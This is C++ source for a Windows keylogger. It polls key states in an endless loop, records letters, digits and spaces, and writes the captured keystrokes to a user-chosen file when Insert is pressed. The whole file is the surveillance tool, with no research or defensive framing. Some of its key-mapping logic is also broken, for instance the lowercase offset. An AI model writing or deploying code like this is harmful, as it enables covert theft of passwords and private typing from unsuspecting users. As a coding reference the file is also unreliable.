#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>

using namespace std;


void writeData(string text)
{
	ofstream f;
	f.open("////////YOUR DIRECTORY YOU WANT KEYS STORED IN GOES HERE\\\\\\\\\\\\\");
	f << text;
	f.close();
	cout << text;
}


string getKeyStrokes(string masterString)
{
	// use GetKeyState function, and for loop to loop through all of the possible options and if any of the keys are toggled send it to writeData()
	for (int i = 65; i < 91; i++)
	{
		int x = i + 30;
		if (GetKeyState(i) & 0x8000)
		{
			char c = i;
			masterString += c;
		}
		else if (GetKeyState(x) & 0x8000)
		{
			char c = x;
			masterString += c;
		}
		else if (GetKeyState(32) & 0x8000)
		{
			Sleep(90);
			masterString += ' ';
		}
		else if (GetAsyncKeyState(VK_INSERT) & 0x8000)
		{
			writeData(masterString);
			exit(1);
		}
	}
	for (int i = 48; i < 58; i++)
	{
		if (GetKeyState(i) & 0x8000)
		{
			masterString += to_string((i - 48));
		}
	}
	return masterString;
}

int main()
{
	string master = "";
	while (TRUE)
	{
		Sleep(90);
		master = getKeyStrokes(master);
	}



	system("pause");
	return 0;

}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu
